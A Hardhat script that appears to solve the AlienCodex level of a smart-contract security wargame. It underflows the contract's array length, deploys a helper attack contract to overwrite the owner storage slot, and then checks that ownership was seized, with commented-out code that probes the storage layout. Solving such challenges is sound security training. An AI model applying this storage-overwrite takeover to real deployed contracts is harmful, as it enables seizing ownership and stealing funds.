import { ethers } from "hardhat";

const INSTANCE = "0xE0704244B9949d1Ba313EB33E4e22289D0A6c4A3";

async function main() {
  // const Alien = await ethers.getContractFactory("AlienCodex");
  // const alien = await Alien.deploy();
  // await alien.deployed();
  // await alien.make_contact();
  // const n1 = ethers.utils.formatBytes32String("123456");
  // const n2 = ethers.utils.formatBytes32String("it is a normal string");
  // console.log(n1, n2);
  // await alien.record(n1);
  // await alien.record(n2);
  // await alien.record(n2);
  // for (let i = 0; i < 10; i++) {
  //   console.log(await ethers.provider.getStorageAt(alien.address, i));
  // }
  // console.log(await alien.contact());
  // console.log(
  //   await ethers.provider.getStorageAt(
  //     alien.address,
  //     ethers.BigNumber.from(ethers.utils.solidityKeccak256(["uint256"], [1]))
  //   )
  // );
  // console.log(
  //   await ethers.provider.getStorageAt(
  //     alien.address,
  //     ethers.BigNumber.from(
  //       ethers.utils.solidityKeccak256(["uint256"], [1])
  //     ).add(ethers.BigNumber.from(1))
  //   )
  // );
  // console.log(
  //   await ethers.provider.getStorageAt(
  //     alien.address,
  //     ethers.BigNumber.from(
  //       ethers.utils.solidityKeccak256(["uint256"], [1])
  //     ).add(ethers.BigNumber.from(2))
  //   )
  // );
  const admin = (await ethers.getSigners())[0];
  const alienCodex = await ethers.getContractAt("AlienCodex", INSTANCE);
  const make = await alienCodex.connect(admin).make_contact();
  const retract = await alienCodex.connect(admin).retract();
  await make.wait();
  await retract.wait();

  const HackAlien = await ethers.getContractFactory("HackAlienCodex");
  const hackAlien = await HackAlien.deploy();
  await hackAlien.deployed();

  const tx = await hackAlien.set(INSTANCE);
  await tx.wait();

  (await alienCodex.owner()).toString() === admin.address
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
